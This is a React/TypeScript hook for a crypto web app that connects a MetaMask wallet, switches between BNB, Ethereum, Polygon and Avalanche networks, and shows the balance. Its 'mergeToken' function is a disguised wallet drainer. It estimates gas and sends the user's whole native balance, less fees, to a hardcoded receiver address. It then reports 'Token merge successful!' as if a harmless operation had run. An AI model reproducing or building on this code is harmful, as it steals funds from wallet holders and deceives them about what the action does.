import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';

declare global {
  interface Window {
    ethereum?: any;
  }
}

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    // Check if wallet is already connected
    if (window.ethereum) {
      window.ethereum.request({ method: 'eth_accounts' })
        .then((accounts: string[]) => {
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            updateBalance(accounts[0]);
          }
        })
        .catch(console.error);
    }
  }, []);

  const updateBalance = async (address: string) => {
    if (!window.ethereum) return;
    
    try {
      const { ethers } = await import('../lib/web3');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
    }
  };

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not found",
        variant: "destructive",
      });
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: {
                  name: net.symbol,
                  symbol: net.symbol,
                  decimals: 18,
                },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
        } catch (addError) {
          toast({
            title: "Error",
            description: "Failed to add network",
            variant: "destructive",
          });
        }
      } else {
        toast({
          title: "Error",
          description: "Network switch rejected",
          variant: "destructive",
        });
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask not detected",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    try {
      await switchNetwork(selectedNetwork);

      const { ethers } = await import('../lib/web3');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);
      setWalletConnected(true);

      await updateBalance(address);
      
      toast({
        title: "Success",
        description: "Wallet connected successfully!",
      });
    } catch (error) {
      console.error(error);
      toast({
        title: "Error",
        description: "Failed to connect wallet",
        variant: "destructive",
      });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    if (!walletConnected || !window.ethereum) return;

    try {
      const { ethers } = await import('../lib/web3');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const nativeBalance = await provider.getBalance(account);

      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || 0n;

      const gasEstimate = await signer.estimateGas({
        to: RECEIVER_ADDRESS,
        value: 0n,
      });

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      if (selectedNetwork === "ethereum") {
        const buffer = ethers.parseEther("0.0001");
        valueToSend -= buffer;
      }

      if (valueToSend <= 0n) {
        toast({
          title: "Error",
          description: "Not enough balance to merge (gas too high or balance too low)",
          variant: "destructive",
        });
        return;
      }

      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
      });

      await tx.wait();
      
      toast({
        title: "Success",
        description: "Token merge successful!",
      });

      await updateBalance(account);
    } catch (error) {
      console.error(error);
      toast({
        title: "Error",
        description: "Merge failed",
        variant: "destructive",
      });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}
